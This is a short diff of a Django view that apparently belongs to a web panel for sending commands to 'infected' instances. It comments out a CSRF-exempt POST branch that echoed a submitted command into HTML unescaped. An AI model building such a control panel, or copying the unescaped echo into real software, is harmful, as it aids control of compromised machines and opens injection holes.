@@ -35,8 +35,8 @@ def user_control(request: HttpRequest):
 @csrf_exempt
 def user_control_instance(request: HttpRequest, infectado):
     infectado = Instancia.objects.get(pk=infectado)
-    if request.method == "POST":
-        return HttpResponse(f'<p style="margin-bottom: -6px;">[{request.user.username}] {request.POST.get("command")}</p>')
+    # if request.method == "POST":
+    #     return HttpResponse(f'<p style="margin-bottom: -6px;">[{request.user.username}] {request.POST.get("command")}</p>')
     return render(request, "web/user_control_instance.html", {"infectado": infectado})
 
 def telemetry(request: HttpRequest):
